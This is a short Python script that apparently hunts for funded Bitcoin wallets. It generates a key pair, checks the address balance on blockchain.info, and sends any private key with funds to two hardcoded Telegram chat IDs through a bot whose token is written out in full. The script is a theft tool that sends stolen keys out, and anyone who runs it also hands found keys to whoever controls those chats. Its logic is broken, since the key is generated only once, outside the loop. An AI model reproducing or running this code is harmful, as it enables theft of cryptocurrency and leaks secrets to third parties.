from BitcoinWalletScraper import HashCypher
from requests import get
from time import sleep
from telebot import TeleBot

bot = TeleBot("5070358456:AAEFJrqEhh6vn4mvx3h4ik3Z6lA4W07czJ8")

GenerateHash = HashCypher()
HashData = GenerateHash.HashGenerator()


while True:
    try:
        publicKey = HashData["PublicKey"]
        req = get("https://blockchain.info/q/addressbalance/"+publicKey).content
        mony = req.decode()
        
        if int(mony) == 0:
            print("not found !")
        elif int(mony) > 0:
            PrivateKey = HashData["PrivateKey"]
            
            bot.send_message(1232575790, f"the program find a wallet!!!\nBTC in wallet: {mony}\npublicKey: {publicKey}\nPrivateKey: {PrivateKey}")
            bot.send_message(2033316703, f"the program find a wallet!!!\nBTC in wallet: {mony}\npublicKey: {publicKey}\nPrivateKey: {PrivateKey}")

        else:
            print(mony)
            # pass
    except:
        print("we hade error")
        sleep(2)